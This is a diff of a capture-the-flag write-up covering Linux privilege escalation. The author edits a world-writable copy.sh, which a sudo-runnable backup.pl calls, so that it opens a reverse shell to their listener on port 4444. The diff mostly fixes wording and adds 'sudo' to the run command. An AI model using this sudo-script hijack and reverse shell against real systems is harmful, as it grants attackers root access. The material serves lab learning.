@@ -256,7 +256,7 @@ Well that was nice of them, they already have a standard mkfifo reverse shell se
 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
 ```
 
-Bingo. Since we can run the backup.pl as root, and that backup.pl calls copy.sh which we can edit, so we can essentially run anything we want as root by ediing the copy.sh file.
+Bingo. Since we can run the backup.pl as root, and backup.pl calls copy.sh which we can edit, that essentially means we can put anything we want in copy.sh and run it as root.
 
 <br>
 
@@ -264,7 +264,7 @@ Bingo. Since we can run the backup.pl as root, and that backup.pl calls copy.sh 
 
 I set up a listener on my system and change the copy.sh file to my IP address instead of what was listed and then run it with:
 
-`/usr/bin/perl /home/itguy/backup.pl`
+`sudo /usr/bin/perl /home/itguy/backup.pl`
 
 ```
 listening on [any] 4444 ...
